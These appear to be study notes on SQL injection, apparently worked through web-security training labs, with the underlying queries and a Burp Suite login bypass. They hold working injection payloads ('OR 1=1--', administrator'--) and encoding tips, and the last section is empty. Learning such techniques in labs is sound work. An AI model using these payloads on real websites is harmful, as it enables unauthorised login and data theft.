# SQL injection

## Example 1

https://insecure-website.com/products?category=Gifts

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

https://insecure-website.com/products?category=Gifts'--

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

https://insecure-website.com/products?category=Gifts%27+OR+1=1--

## URL decoding

- Single quote **'**: %27 `encodeURIComponent` does **NOT** encode single quote
- Double qoute **"**: %22
- space: + or %20

## Lab 2: SQL injection vulnerability allowing login bypass

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

-- bypass the password
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'bluecheese'
```

Login as administrator, with any password.

From Burp Suite, intercept POST request

```
// From
csrf=nc1SgyYgCJsHaE3oyFvpZYV6vw0s4dAG&username=administrator&password=password
// To
csrf=nc1SgyYgCJsHaE3oyFvpZYV6vw0s4dAG&username=administrator'--&password=password
```

## Retrieving data from other database tables

```sql
```
